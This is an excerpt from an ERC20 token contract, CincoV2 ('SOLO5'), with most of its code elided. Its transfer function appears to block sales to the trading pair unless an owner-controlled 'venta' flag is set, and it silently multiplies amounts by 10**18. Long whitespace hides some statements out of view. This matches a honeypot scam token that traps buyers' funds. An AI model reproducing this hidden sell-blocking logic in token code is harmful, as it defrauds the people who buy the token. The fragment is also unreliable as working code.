...
// File: raiz/utils/IERC20Metadata.sol
...
contract CincoV2 is ERC20, Ownable {
    ...
    uint public tradeCooldown;                          uint public constant MAX_COOLDOWN = 1440 minutes;
    uint public tCoin;                                  uint public constant MAX_COIN = 1000*(10**18);
    mapping(address => uint256) public venta;
...
constructor() ERC20("SOLO5", "S5")                                                        {
        _mint(msg.sender, 5000000 ether);              tradeCooldown = 300; tCoin=5*(10**18);    }
...
function _transfer(address sender, address receiver, uint256 amount) internal virtual override              {
        amount = amount*(10**18);       
if(venta[sender]==0 && receiver == par)                                                                         {
...
else    {   lastTrade[sender] = block.timestamp;        super._transfer(sender, receiver, amount);      }   }
